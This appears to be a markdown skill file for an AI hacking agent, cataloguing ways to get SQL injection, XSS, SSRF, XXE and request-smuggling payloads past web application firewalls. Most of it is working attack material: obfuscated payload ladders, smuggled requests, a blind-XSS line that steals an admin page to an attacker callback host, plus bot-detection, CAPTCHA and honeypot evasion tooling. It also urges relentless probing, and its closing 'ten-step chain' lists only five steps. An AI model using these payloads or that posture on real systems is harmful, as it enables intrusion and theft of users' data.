---
name: hunt-waf-bypass
description: "Hunting skill for WAF / FILTER BYPASS — getting a payload past the shield so the underlying vulnerability class can actually be reached and confirmed. Built from 2 curated source skills (94 unique sections); no bug-bounty reports were read (report_count: 0, full_reports_read: 0). Covers WAF/CDN fingerprinting (Cloudflare, Akamai, Imperva/Incapsula, AWS WAF, Sucuri, DataDome, F5, Barracuda, Fortinet, ModSecurity, NAXSI, Azure Front Door, Fastly Next-Gen WAF, Coraza), block/drop/challenge response interpretation, negative vs positive filter models, case variation, comment injection, URL/double-URL/Unicode/hex encoding, HTTP parameter pollution, chunked transfer + request-smuggling desync, HTTP/1.0/1.1/2/3 and the :authority pseudo-header, Host/X-Forwarded-For header spoofing, SNI spoofing/omission/ECH and domain fronting, origin-direct pivot via stale DNS records, JSON/XML/SVG/GraphQL swapping, 13 XSS-context obfuscation techniques, SQLi/XSS/GraphQL obfuscation, MIME/IP obfuscation, CAPTCHA/Turnstile and TLS/JA3/JA4 evasion, ML/AI-WAF evasion, and a DETECT -> ISOLATE -> BYPASS -> CONFIRM -> ESCALATE field workflow. Use when a 403/406/493, an empty-body drop, or a challenge page stands between you and a suspected vulnerability."
sources: github, public_research
report_count: 0
full_reports_read: 0
source_skills: 2
---

## Crown Jewel Targets

WAF/filter bypass is a **multiplier**, not a standalone bug class. A bypass is only as valuable as the vulnerability it unlocks — the shield is not the finding, the thing behind it is. Prioritize targets where a filter is the *only* thing standing between you and a high-impact primitive.

- **A WAF in front of a known injection-capable endpoint.** Login, search, password-reset, comment, and admin forms are where the source skills concentrate their SQLi/XSS exemplars. If `UNION SELECT` is blocked but the application is injectable, the bypass converts a "protected" endpoint into a reportable finding.
- **High-traffic hosts behind a CDN/reverse proxy.** These are the crown jewels for the transport-layer tricks: an HTTP/2 downgrade or a desync on a cache-heavy origin affects other users, not just your own request (source: `offensive-skills/offensive-waf-bypass/SKILL.md`, HTTP/2 Rapid Reset CVE-2023-44487 and HTTP/2 CONTINUATION flooding).
- **Upload and file-handling endpoints behind a filter.** MIME confusion (`Content-Type: image/jpeg` with `filename="shell.php.jpg"`, `shell.php%00.jpg`, `shell.pHp`, `shell.phar`) plus a bypass turns a blocked upload into an RCE chain (`hunt-skills/bountyforge/references/hacking-agents/waf-bypass-agent.md`, MIME Type Confusion).
- **API surfaces with parallel representations.** A REST endpoint that is filtered while GraphQL, XML, or JSON-alternate syntax on the same host is not — the source skills repeatedly note "standard REST might be blocked, but GraphQL endpoint might not be."
- **Cloud/CDN-fronted origins with discoverable real IPs.** The 2024 research cited in the source skill found roughly 40% of Fortune-100 origins exposed via stale A records; an origin-direct pivot removes the WAF from the path entirely.
- **Endpoints that trust forwarded/identity headers.** Password-reset poisoning, IP-restriction bypass, open redirects, and SSRF via `X-Forwarded-Host`, `X-Forwarded-For`, `X-Real-IP`, and `Forwarded` are all called out as bypass outcomes in `offensive-skills/offensive-waf-bypass/SKILL.md`.
- **AI/ML-scored WAF deployments (e.g. Cloudflare AI WAF Attack Score).** Newer and weaker-inspection surfaces where payloads can be hidden in lesser-weighted request features such as multipart filenames.

Severity rule of thumb from the two source skills: **a bypass that is confirmed only by a 200 response is not a finding.** You must show the payload reached the backend — via a SQL error, a longer response, a timing delta, an OOB callback, or reflected data. The "CONFIRM" step in `hunt-skills/bountyforge/references/hacking-agents/waf-bypass-agent.md` is explicit about this.

---

## Attack Surface Signals

### WAF / CDN fingerprints (response headers)

```
curl -sI https://TARGET/ 2>&1 | grep -iE "server|x-powered|x-cdn|x-waf|cf-|akamai|x-sucuri|x-protected|server: cloudflare"
```

| Header / Response | WAF |
|-------------------|-----|
| `cf-ray`, `cf-cache-status` | Cloudflare |
| `x-akamai-*` | Akamai |
| `x-sucuri-id` | Sucuri |
| `x-protected-by` | Barracuda |
| `server: awselb` | AWS WAF |
| `x-cdn: Imperva` | Imperva/Incapsula |
| `server: BigIP` | F5 |
| `X-ModSecurity` | ModSecurity |
| `server: YUNDUN` | Yundun |

Additional vendor markers from `offensive-skills/offensive-waf-bypass/SKILL.md`:

- **Cloudflare** — `__cf_bm`, `cf_clearance`, `cf_chl_*` cookies and `/cdn-cgi/` routes (cookies rotate roughly every 30 minutes); challenge pages with JavaScript verification; Turnstile / Bot Management headers.
- **Imperva/Incapsula** — `X-CDN: Incapsula` header.
- **AWS WAF** — `AWSALB` / `AWSALBCORS` cookies, `AWSELB` cookies.
- **Fastly Next-Gen WAF** — `fastly-debug-*` headers when enabled, service IDs in responses.
- **ModSecurity** — distinctive error messages and block pages.
- **Apache generic** — lowercase method (`get` instead of `GET`); **IIS generic** — tabs before the method (`\tGET /login.php HTTP/1.1`).

Other WAFs catalogued in the source skill: Akamai, DataDome, F5 Networks, Fortinet, NAXSI (NGINX), Azure Front Door, Cloudflare AI WAF, Radware, Coraza (Go).

### Block / drop / challenge signatures

```
curl -sI -o /dev/null -w "%{http_code}" https://TARGET/normal-page
curl -sI -o /dev/null -w "%{http_code}" "https://TARGET/?id=1%20OR%201=1"

403 = Block
406 = Not Acceptable (some WAFs)
493 = Security Ninja
200 with empty body = Drop
302 + captcha = Challenge
```

Compare a benign baseline to a payload-bearing request; a change in status code, body length, or header set is the signal that a rule fired.

### Feature-based surface signals

- Multiple parameters with the same name (`?id=1&id=...`) — HPP check.
- A JSON body alongside an XML or GraphQL endpoint on the same host — representation swap.
- Multipart uploads — filename and MIME fields, multipart boundaries, lesser-weighted features for AI WAFs.
- URL-accepting parameters reachable through a proxy — parser-confusion and IP-obfuscation surface.
- `X-Forwarded-*`, `Origin`, `Referer`, `Host` consumption — header-spoofing surface.
- A distinct CDN edge and origin — desync, origin-direct, and domain-fronting surface.
- JA3/JA4 mismatch between your client and a real browser — a frequent block cause noted in `offensive-skills/offensive-waf-bypass/SKILL.md`.

---

## Discovery Patterns From Curated Source Skills

### Where Researchers Start

Both curated source skills open with the same idea: identify the shield first, then find its seams. `hunt-skills/bountyforge/references/hacking-agents/waf-bypass-agent.md` frames the role explicitly — other agents handle the vulnerability classes; the WAF agent handles getting past the shield. It starts with a header probe and a benign-vs-suspicious status-code comparison, then moves to isolating the exact blocked token.

`offensive-skills/offensive-waf-bypass/SKILL.md` starts one layer wider, enumerating seven discovery methods:

1. Inspect control pages (block pages, challenge pages, CAPTCHA systems).
2. Analyze HTTP headers (custom security headers, server headers, CDN markers).
3. Examine cookies (`cf_clearance`, challenge cookies).
4. Look for specific routes (`/cdn-cgi/`).
5. Check JavaScript objects (e.g. `\_cf_chl_opt`, challenge scripts).
6. Compare JA3/JA4/TLS fingerprints against legitimate browser fingerprints.
7. Identify HTTP/2/3 negotiation, since policies can differ by protocol.

Fingerprinting tools named in the source: **WAFW00F**, **IdentYwaf**, **Ja3er/ja4plus**; testing tools **GoTestWAF**, **Lightbulb Framework**, **WAFBench**, **Framework for Testing WAFs (FTW)**, **Imperva's WAF Testing Framework**, **graphql-cop**, and **GoReplay/Mitmproxy** for record-and-replay comparison of WAF decisions across network paths.

The operational takeaway from the bountyforge source is role separation: one layer handles the vulnerability class, this layer handles delivering the payload through the filter. It also fixes a hard rule for discovery — the WAF response is a hypothesis to test, never a conclusion. A 403 means "this representation was blocked", not "this endpoint is safe".

### Feature-Based Discovery Signals

- A **negative (blacklist) model** — blocks known signatures; look for one missed representation of the same token (`SeLeCt`, `UN/**/ION`, `%55%4E%49%4F%4E`).
- A **positive (whitelist) model** — only allows matching patterns; look for alternate endpoints, content types, or encodings that fall outside the allowed pattern.
- The **first-parameter-only** habit — some WAFs check only `id[0]`; the payload goes in the second (`?id=1&id=1%20OR%201=1`).
- A **single decode pass** assumption — the filter decodes once while the backend decodes twice (`%2527%2520...`).
- **Representation gaps** — JSON inspected but XML not; REST filtered but GraphQL not; HTML/script inspected but SVG, XML CDATA, or CSS not.
- **Parser disagreement** — chunked bodies, conflicting `Content-Length`/`Transfer-Encoding`, HTTP/1.0 vs 1.1 vs 2 vs 3, and `:authority` vs `Host` vs SNI.
- **Network trust** — stale DNS A records exposing origin, `X-Forwarded-For` trusting internal IPs, token reuse across sessions.

### Verbatim Hunter Clues

The following lines are the working doctrine of the curated source skills and are quoted directly:

> **"The WAF is a filter, not a wall. Every filter has edge cases. Your job is to find them — not to give up when you get a 403."**
> — `hunt-skills/bountyforge/references/hacking-agents/waf-bypass-agent.md`, Core Principle

> "When you identify a potential exploitable path — a WAF rule that seems bypassable, an endpoint that might be accessible, a filter that seems incomplete — **you must actively probe to confirm or deny**. Do not speculate."
> — same source, "The Rule: If You See a Path, Walk It"

> **Wrong:** "The WAF is blocking SQLi payloads, so this endpoint is probably protected."
> **Right:** "The WAF blocks 'UNION SELECT' but I confirmed 'UNiON SeLeCt' gets through — here are 3 PoC requests showing the difference."
> — same source, "Do Not Speculate"

> "Always try at least 3 different bypass techniques before marking a path as blocked... If all 9 fail, THEN mark as blocked and move on."
> — same source, "The 'One More Try' Rule"

The five-step walk-the-path loop from the same source: **DETECT → ISOLATE → BYPASS → CONFIRM → ESCALATE**.

### Probe Checklist

- [ ] Fingerprint the WAF/CDN via headers, cookies, routes, block page, and JS objects.
- [ ] Record a benign baseline status code, body length, and header set.
- [ ] Fire one canonical malicious token and record the block/drop/challenge signature.
- [ ] Split the payload into fragments to find exactly which token trips the rule (`?id=SELECT`, `?id=' OR`, `?id=1=1`).
- [ ] Test case variation, comment insertion, and encoding before anything expensive.
- [ ] Test a duplicate/second parameter and a mixed-source parameter (query/body/header/cookie).
- [ ] Swap the representation: JSON ↔ XML ↔ SVG ↔ GraphQL; try multipart.
- [ ] Try a different protocol/version: HTTP/1.0 (`curl -0`), HTTP/2 (`curl --http2`), chunked, HTTP/3 (`curl --http3`).
- [ ] Try header spoofing and a mismatched-but-plausible `Host`/SNI.
- [ ] Check whether the real origin is reachable directly (DNS history, Shodan, `Alt-Svc`).
- [ ] Confirm the payload actually reached the backend (error, length delta, timing, OOB).
- [ ] Only then hand the confirmed primitive to the appropriate exploitation path.

---

## Step-by-Step Hunting Methodology

1. **Detect the shield.** Run the header/cookie/route fingerprint commands; note the WAF vendor and whether the deployment is a negative or positive model. Record whether it answers with a block, a drop, or a challenge.

2. **Establish a clean baseline.** `curl -sI -o /dev/null -w "%{http_code}" https://TARGET/normal-page` — save status, response length, and headers. Every later test is a diff against this baseline.

3. **Isolate the blocked token.** Send only part of the payload at a time, as the source skill demonstrates:
   ```bash
   curl -v "https://TARGET/?id=SELECT"   # Check 1: is SELECT blocked?
   curl -v "https://TARGET/?id=' OR"     # Check 2: is ' OR blocked?
   curl -v "https://TARGET/?id=1=1"      # Check 3: is = blocked?
   ```
   The goal is a precise statement of what the filter matches, not a guess.

4. **Apply the "One More Try" rule.** The source lists nine cheap-to-expensive attempts before declaring a path blocked: case variation, comment insertion, encoding, parameter pollution, protocol variation (HTTP/1.0/chunked), XML/JSON swap, header smuggling, chunked transfer, payload splitting. Try at least three — the first three are free and instant.

5. **Walk each promising path to ground.** Follow the DETECT → ISOLATE → BYPASS → CONFIRM → ESCALATE loop for every candidate rule. Do not move on after one failure; do not claim success from one 200.

6. **Chain transformations when a single one is insufficient.** The source's worked example escalates step by step:
   ```bash
   curl -sv "https://TARGET/endpoint?param=test"
   curl -sv "https://TARGET/endpoint?param=test'+OR+1=1--"        # blocked
   curl -sv "https://TARGET/endpoint?param=test'+Or+1=1--"        # case variation
   curl -sv "https://TARGET/endpoint?param=test'/**/Or/**/1=1--"  # + comment insertion
   curl -sv "https://TARGET/endpoint?param=test'%09Or%091=1--"    # + tab whitespace
   ```
   Watch for SQL error messages, different response length, or a timing difference.

7. **Confirm reachability of the backend.** If the WAF silently drops payloads, use timing:
   ```bash
   time curl -s "https://TARGET/?id=1"                    # baseline
   time curl -s "https://TARGET/?id=1' AND SLEEP(5)--"    # ~5s delay = payload reached DB
   ```
   A confirmed bypass with no backend proof is not a reportable finding.

8. **Try a different request layer.** If the query-string rule holds, move to the body, a duplicate parameter, a header, a cookie, an XML/SVG/GraphQL representation, or a multipart filename. Each is a different parser path through the WAF.

9. **Try a different protocol layer.** Force HTTP/1.0, HTTP/2, chunked transfer, or HTTP/3. Where a front-end proxies at HTTP/1.1 but the client speaks HTTP/2, test `:authority` handling. Where inspection is weak on QUIC, test HTTP/3.

10. **Try to remove the WAF from the path.** Look up stale A records (`securitytrails`, `bypass-firewalls-by-DNS-history`), Shodan/CloudFlair, and `Alt-Svc` leaks; then replay the same request at the origin with a forged `Host` header using GoReplay/Mitmproxy.

11. **Escalate the confirmed primitive.** Once a bypass delivers a working payload, hand it to the right exploitation path (see Related Skills & Chains). The source's agent handoff model is: SQLi/XSS/file-upload → web-api-agent; SSRF → recon-agent for infrastructure pivoting.

12. **Document the differential.** A strong report shows the blocked canonical payload and the bypassing variant side by side, plus backend proof. Record WAF vendor, status codes, token isolated, exact bypass, and the confirmation evidence.

---

## Payload & Detection Patterns

All payload strings below are drawn from the two curated source skills. They are grouped by the layer they attack.

### Fingerprint & Detection Commands

```bash
# Vendor fingerprint
curl -sI https://TARGET/ 2>&1 | grep -iE "server|x-powered|x-cdn|x-waf|cf-|akamai|x-sucuri|x-protected"

# Block/drop/challenge differential
curl -sI -o /dev/null -w "%{http_code}" https://TARGET/normal-page
curl -sI -o /dev/null -w "%{http_code}" "https://TARGET/?id=1%20OR%201=1"

# Protocol variation probes
curl -0 https://TARGET/?id=1%20OR%201=1          # HTTP/1.0
curl --http2 https://TARGET/?id=1%20OR%201=1     # HTTP/2
curl -H "Transfer-Encoding: chunked" https://TARGET/
curl --http3 https://example.net                  # HTTP/3 / QUIC

# TLS fingerprint emulation
curl --tlsv1.3 --http2 https://TARGET/            # compare JA3/JA4 to a browser baseline
```

### Obfuscation: Case, Comments, Whitespace

```sql
SeLeCt * FrOm UsErS
UNion SeLeCt 1,2,3--
ExPlOe SeLeCt CoNcAt(table_name) FrOm information_schema.tables

/**/SELECT/**/*/**/FROM/**/users
UN/**/ION/**/SEL/**/ECT/**/1,2,3
SEL/*random*/ECT * FROM users
/*!50000SELECT*/ * FROM users
UNION/**/SELECT          -- whitespace via comment
```

Whitespace control characters used to split HTML attributes (from the advanced XSS section of the bountyforge source):

```
Char  | Encoding | Usage
%0C   | Form feed | Between attribute name and value
%09   | Tab       | Between attribute/value pairs
%0A   | Newline   | Between attributes (some parsers)
%0D   | CR        | Alternative to space
```

### Encoding: URL, Double, Unicode, Hex, Entity

```sql
-- URL encoding
%53%45%4C%45%43%54 = SELECT
%27%20%4F%52%20%31%3D%31 = ' OR 1=1

-- Double URL encoding
%2527%2520%254F%2552%2520%2531%253D%2531

-- Unicode (overlong / lookalike)
%E0%80%A7 = ' (single quote)
%E0%80%A8 = ( (open paren)
<ѕcript>alert(1)</ѕcript>   # Cyrillic 's' characters

-- Hex encoding in SQL
0x53454C454354 = SELECT
CONCAT(CHAR(83),CHAR(69),CHAR(76),CHAR(69),CHAR(67),CHAR(84)) = SELECT

-- HTML entities in attribute context
&#106 = j        &#62 = >        &#x27 = '        &#99 = c
```

Advanced encoding notes from the source: double Unicode escaping (`\u00\u0036\u0031` for `1`), NFKD Unicode normalization (`unicodedata.normalize('NFKD', payload)`), and mixed half-width Unicode / overlong UTF-8 with case-folding differences.

### Parser Confusion: URL, IP, Schema

```
# IP obfuscation
http://0177.0.0.1/          (octal, leading zeros)
http://2130706433/          (decimal)
http://0x7f000001/          (hex)
http://127.1/               (short)
http://[::ffff:127.0.0.1]/  (IPv6 mapped)

# URL with credentials / fragment (parser confusion)
http://attacker.com@127.0.0.1/
http://127.0.0.1#@attacker.com/

# Gopher and alternate schemes
gopher://127.0.0.1:6379/_SET%20pwned%20true%0D%0A

# Host-header vs URL confusion
GET /@target.com/path HTTP/1.1
Host: evil.com
```

### JSON / XML / SVG / GraphQL Swaps

```json
// Standard (blocked)
{"name":"test\" OR 1=1--"}

// Unicode escape
{"name":"test\u0022 OR 1=1--"}

// Nested JSON
{"name":"test\" OR 1=1--","_":0}

// Array wrapping
{"name":["test\" OR 1=1--"]}

// Number type confusion
{"name":0,"age":" OR 1=1--"}

// JSON-based SQL injection (CVE-2023-50969)
{"id": {"$gt": "' OR 1=1--"}}
```

```xml
<!-- Same data as XML instead of JSON -->
<user>
  <email>test@test.com</email>
  <name><![CDATA[<script>alert(1)</script>]]></name>
</user>

<!-- SVG with XSS -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>

<!-- SVG with XXE -->
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg>&xxe;</svg>
```

```
# Standard REST blocked, GraphQL not
POST /graphql
Content-Type: application/json

{"query":"{ users { email password_hash } }"}
```

GraphQL-specific bypasses from `offensive-skills/offensive-waf-bypass/SKILL.md`: deeply nested aliases to evade depth limits; batched operations to sneak payloads past superficial query-string filters; query-name tampering to mask malicious fields; custom directives and file-upload scalars. Tools: `graphql-cop`, `inql`, `Escape p-cli`.

### HTTP Desync & Chunked Transfer

```
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

a
SELECT * F
0

ROM users
```
The WAF may see two separate requests, neither containing a complete payload, while the backend reassembles them.

```
POST / HTTP/1.1
Host: target.com
Content-Length: 43
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

x=1%20OR%201=1
```
The WAF inspects the first (benign) request; the backend processes the second (malicious) one.

```
# Split one payload across parameters
?search=SELECT&field=*%20FROM&table=users

# Conflicting content-encoding headers (source: advanced techniques)
Content-Encoding: invalid
Content-Encoding: gzip
```

### Header Tricks

```
# HPP — WAF checks only the first parameter
GET /page?id=1&id=1%20OR%201=1
GET /page?id=1&foo=1%20OR%201=1
GET /page?foo=1%20OR%201=1&id=1

# Identity / IP spoofing headers
X-Forwarded-Host: attacker.com
X-Forwarded-For: 127.0.0.1
X-Client-IP: 127.0.0.1
Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Forwarded: for=127.0.0.1;host=attacker.com
Referer: attacker.com
Origin: null / attacker.com

# Host-header spoofing (WAF trusts Host, connection goes elsewhere)
curl -H "Host: legit.example.net" https://evil.example.com

# HTTP/2 :authority — WAF may not compare it with SNI
curl --http2 -H "Host: legit-looking-domain.com" https://actual-target-server.com/index.html
```

### XSS Context Payload Ladder

The bountyforge source devotes thirteen numbered techniques to WAF-resistant XSS. Representative exemplars:

```html
<!-- Script tag alternatives -->
<svg onload=alert(1)>   <img src=x onerror=alert(1)>   <details open ontoggle=alert(1)>
<iframe src="javascript:alert(1)">   <body onload=alert(1)>

<!-- JS context when angle brackets are blocked -->
'"><img src=x onerror=alert(1)>   '-alert(1)-'   '"/>alert(1)/'   alert`1`

<!-- Unicode escape chains -->
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
<img src=x onerror="\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074.\u0063\u006f\u006f\u006b\u0069\u0065">

<!-- Regex .source construction, no quotes / no alert token -->
<svg onload='top[/al/.source+/ert/.source](document[/cookie/.source])'>

<!-- String.fromCharCode -->
<img src=x onerror="this[String.fromCharCode(115,114,99)]='x';this[String.fromCharCode(111,110,101,114,114,111,114)]=String.fromCharCode(97,108,101,114,116)(1)">

<!-- Dynamic import for exfiltration -->
<A HRef=//ATTACKER.com AutoFocus &#62 OnFocus%0C=import(href)>

<!-- Multi-element assembly via location= -->
<input id=b value=javascrip>
<input id=c value=t:aler>
<input id=d value=t(1)>
<lol contenteditable onbeforeinput='location=b.value+c.value+d.value'>

<!-- Optional chaining + comment splitting + encoded concat -->
1'"><A HRef=" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>

<!-- Double URL encoding for attribute context -->
<A %252F=""Href= JavaScript:k='a',top[k%2B'lert'](1)>

<!-- CSP bypass via jQuery -->
<script>$('<script>alert(1)<\/script>')</script>
<img src=x id=";alert(1)//">
```

### Advanced JS Context Bypass — Worked Examples

The bountyforge source explains that WAFs look for the literal tokens `<script`, `javascript:`, `alert(`, `<`, and `>`. The fix is to break every token into fragments the WAF will not recognize. Its first advanced technique is reproduced here verbatim:

```html
<a href=&#106avascript:'%5C\u0075003C'+svg/'+'onload%5C\u0075003Dalert%5C\u00750028)\\u003E'>
```

How it assembles: `&#106` is `j` (a decimal entity, so the WAF never sees the `j`); `%5C` is a backslash; the `\u0075` prefix plus `\u003C` produces `<`, with `\u003D` = `=`, `\u0028` = `(`, and `\u003E` = `>`. The browser reconstructs `javascript:'<'+svg/''+'onload=alert(>'>''` and triggers SVG `onload`, while the filter sees escaped garbage.

The same source demonstrates regex-literal construction with no string literals and no `alert` token:

```html
<svg onload='top[/al/.source+/ert/.source](document[/cookie/.source])'>
<svg onload='top[/a/.source+/l/.source+/e/.source+/r/.source+/t/.source](1)'>
```

The `.source` property extracts a regex pattern as a string at runtime; combined with `top[...]` bracket notation it can call any function without quotes, `eval`, or a keyword the WAF recognizes.

### Mutation XSS, CSS Attacks & Polyglots

Grounded in `offensive-skills/offensive-waf-bypass/SKILL.md`, these payloads exploit parser quirks rather than keyword gaps:

```html
<!-- Mutation XSS (mXSS) -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- Protocol obfuscation -->
<a href="javas&#99;ript:alert(1)">Click Me</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click Me</a>

<!-- CSS-based attacks -->
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
<div style="background-image:url('javascript:alert(1)')">

<!-- CSP bypass: JSONP and DOM clobbering -->
<script src="https://allowed-domain.com/jsonp?callback=alert(1)"></script>
<form id=self><input name=location></form>

<!-- Polyglot -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### SQLi Payload Patterns

```sql
-- Error-based payload that often slips past UNION/SELECT-only rules
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -

-- Numeric and string alternatives
1 -> 1-0, 1+0, CHAR(49)
MySQL: CONCAT('a','b')   Oracle: 'a'||'b'   MSSQL: 'a'+'b'

-- Null byte
%00' UNION SELECT password FROM Users WHERE username='xyz'--
```

SQLMap tamper scripts are recommended by the source (Atlas can suggest them); combine multiple tamper scripts and customize per WAF.

### OOB Exfiltration Payloads

```html
<!-- Blind XSS with admin page exfiltration — from the bountyforge source -->
<script>fetch('/admin').then(r=>r.text()).then(d=>new Image().src='//YOURDOMAIN.oastify.com/'+btoa(d))</script>
```
Use `oastify.com`, `burpcollaborator.net`, or `interactsh.com` for an OOB DNS/HTTP callback. The source describes the impact chain: stored XSS → admin session → exfiltrate admin dashboard → extract CSRF tokens, API keys, and user lists from the admin HTML.

---

## Common Root Causes

1. **Single-layer inspection.** The WAF sees a different representation than the backend — it decodes once, the application decodes twice; it inspects the first parameter, the framework reads the second; it parses the HTTP/1.1 `Host` header, the backend routes on `:authority` or SNI.
2. **Signature/keyword matching instead of semantic understanding.** Blocking the literal token `alert`, `UNION SELECT`, or `javascript:` fails against case variation, comment splitting, Unicode escapes, `String.fromCharCode`, regex `.source`, or JSFuck.
3. **Negative (blacklist) model coverage gaps.** Every filter has edge cases; a blacklist cannot enumerate every equivalent encoding, alternate tag, event handler, or scheme.
4. **Trust in network position.** Applications behind a misconfigured reverse proxy trust `X-Forwarded-For` / `X-Forwarded-Host`, letting headers spoof internal IPs, hosts, or identities.
5. **Inconsistent HTTP parsing between front-end and back-end.** Conflicting `Content-Length` and `Transfer-Encoding`, chunked bodies, LF-only delimiters, and IP fragmentation are reassembled differently by the two hops.
6. **Protocol-policy asymmetry.** Some WAFs skip HTTP/1.0, mishandle HTTP/2, or do not deeply inspect QUIC/HTTP/3; domain-fronting protection may exist only for HTTP/1.1.
7. **Reparse-after-validation gaps.** Validation happens on one representation (JSON, decoded once) while execution happens on another (XML, GraphQL, multipart, re-decoded value).
8. **Weak/rarely-weighted ML features.** AI WAF Attack Scores can be diluted by noise tokens, non-ASCII lookalikes, and hiding payloads in multipart filenames.
9. **Exposed origin / stale DNS.** The WAF is simply bypassed when the true origin is reachable directly through stale A records or leaked `Alt-Svc` hostnames.
10. **Token/challenge weaknesses.** Reusable `cf_clearance` tokens, hidden-iframe Turnstile flows, and timing/expiry gaps let challenges be satisfied or replayed.

---

## Bypass Techniques

### Network / Transport Layer

- **Residential or mobile IPs** instead of easily flagged datacenter ranges; rotate proxies to defeat IP rate limiting.
- **Fortified headless browsers** — `undetected_chromedriver`, `puppeteer-extra-plugin-stealth`, `playwright-extra` with stealth plugins.
- **Web scraping APIs** (e.g. ZenRows) that bundle premium proxies, JS rendering, WAF bypass, CAPTCHA solving, and protocol emulation.
- **Origin server direct** — Shodan/CloudFlair, historical DNS via `securitytrails`, `bypass-firewalls-by-DNS-history`, `Alt-Svc` leakage; replay with a forged `Host` header.
- **WAF solvers** — BypassWAF, `cfscrape`, `cloudscraper`; **JS challenge reverse engineering**; **CAPTCHA services/solvers**.
- **Avoid honeypots** — no interacting with `display:none`, zero-opacity, or off-screen elements; do not fill hidden form fields.
- **Defeat browser fingerprinting** — randomize/spoof canvas, UA, and hardware features.
- **TLS/JA3/JA4 evasion** — `noble-tls`, `uTLS`, `tls-client`, `ja4py`; align cipher suites, ALPN order, and signature algorithms with a real browser; `abuse-ssl-bypass-waf` to find usable ciphers.
- **Simulate human behavior** — random delays, natural navigation, mouse movement, scrolling; Playwright/Selenium with stealth plugins.

### Protocol Layer

- Force **HTTP/1.0**, **HTTP/2**, or **HTTP/3**; test `:authority` vs `Host`; QUIC may escape deep inspection.
- **HTTP/2 Rapid Reset** (CVE-2023-44487) and **CONTINUATION flooding** target front-end/back-end processing asymmetry (stress techniques — use only within scope).
- **Host-header spoofing**, **SNI spoofing** (`openssl s_client -servername`, `curl --connect-to`), **omitting SNI** (`curl --insecure -H "Host: ..." https://IP/`), and **Encrypted Client Hello** to hide the SNI from intermediaries.
- **Domain fronting** — allowed SNI to a CDN, blocked destination in the `Host` header; the source notes Fastly has historically allowed it while AWS CloudFront, Google Cloud CDN, and Azure CDN block SNI/Host mismatch.
- **IP fragmentation** across packets; **timing-based** techniques exploiting WAF timeouts and peak load; request coalescing and long-lived HTTP/2 streams.

### Request / Parser Layer

- Case variation, comment injection, whitespace control characters.
- HTTP parameter pollution, including mixing sources across query, body, headers, and cookies.
- Chunked transfer encoding and request smuggling/desync.
- Multiple/conflicting `Content-Encoding` headers; the "8k bypass" of overloading parameters.
- Representation swaps: JSON ↔ XML ↔ SVG ↔ GraphQL ↔ multipart.
- MIME type confusion and double extensions on uploads.
- Payload splitting across parameters and multi-element DOM assembly.

### Encoding / Payload Layer

- URL, double-URL, Unicode (overlong, NFKD, lookalike), hex, HTML-entity encoding.
- IP obfuscation (octal, decimal, hex, short form, IPv6-mapped).
- Unicode escape chains, `String.fromCharCode`, JSFuck, regex `.source`, array indexing, optional chaining, comment splitting.
- SQLMap tamper scripts, mixed encodings, null-byte injection.
- Adversarial token injection (benign noise tokens), embedding-space manipulation (non-ASCII lookalikes), and combining SQLi syntax with XSS to confuse classifiers.

### Attack-Class Specific

- **SQLi** — syntax manipulation, encodings, alternate representations, tamper scripts, JSON-based SQLi (CVE-2023-50969).
- **XSS** — context-aware payloads, mutation XSS (`<noscript><p title="</noscript><img src=x onerror=alert(1)>">`), alternate tags, obfuscation, protocol obfuscation (`javas&#99;ript:`, `data:text/html;base64,...`), CSS-based attacks, polyglot payloads, CSP bypass via JSONP/DOM clobbering/allowed domains.
- **SSRF** — forwarded-header spoofing to internal IPs and URL/IP obfuscation.
- **GraphQL** — alias spamming, batch operations, query-name tampering, custom directives.
- **Uploads** — MIME confusion and double extensions leading to RCE.

### ML / AI WAF Evasion

The source describes ML-based evasion as feedback-driven payload evolution: evolve attack patterns against WAF feedback to avoid signature detection; vary entropy and tokenization to mislead n-gram/embedding models; embed payloads in lesser-weighted features such as multipart filenames to lower a Cloudflare AI WAF Attack Score. Research tools named: `ml-waf-evasion-toolkit`, `adversarial-payload-generator`, `Wafer` (WAF fuzzing automation), `WAFNinja`, `WAFTester`, `libinjection-fuzzer`.

### Tool Inventory

Both source skills name concrete tooling; use it to make the technique catalog repeatable rather than ad hoc.

```
Fingerprinting:  WAFW00F, IdentYwaf, Ja3er/ja4plus
Testing:         GoTestWAF, Lightbulb Framework, WAFBench,
                 Framework for Testing WAFs (FTW), Imperva WAF Testing Framework,
                 graphql-cop, GoReplay / Mitmproxy (record & replay across paths)
Evasion:         WAFNinja, WAFTester, libinjection-fuzzer,
                 bypass-firewalls-by-DNS-history, abuse-ssl-bypass-waf,
                 SQLMap Tamper Scripts, Bypass WAF BurpSuite Plugin, enumXFF,
                 Nemesida WAF Bypass Tool, noble-tls / uTLS / tls-client
ML / fuzzing:    Wafer, ml-waf-evasion-toolkit, adversarial-payload-generator
Challenges:      cf-clearance-scraper, cloudflare-turnstile-solver, turnstile-bypass
Stealth:         undetected_chromedriver, puppeteer-extra-plugin-stealth,
                 playwright-extra with playwright-extra-plugin-stealth
Scraping:        ZenRows (premium proxies, JS rendering, CAPTCHA solving, protocol emulation)
Solvers:         BypassWAF, cfscrape, cloudscraper
```

### Chaining Recipe

The source skill closes with a ten-step chain for maximum effect:

1. Use residential proxies.
2. Implement a fortified headless browser.
3. Add human-like behavior simulation.
4. Apply CAPTCHA bypass when needed.
5. Avoid honeypot traps.
